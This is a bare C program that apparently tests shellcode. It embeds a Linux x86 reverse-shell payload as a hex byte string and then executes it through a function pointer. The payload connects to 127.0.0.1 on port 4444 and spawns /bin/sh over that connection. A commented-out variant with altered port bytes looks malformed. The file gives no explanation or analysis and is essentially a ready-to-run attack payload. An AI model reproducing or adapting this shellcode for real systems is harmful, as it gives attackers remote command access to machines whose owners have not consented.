#include<stdio.h>
#include<string.h>


unsigned char buf[] = 

"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\xb9\x02\x00\x66\x51\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

/**
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x66\x7a\x69\x66\xb9\x02\x00\x66\x51\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
**/
main()
{


	int (*ret)() = (int(*)())buf;

	ret();

}

	
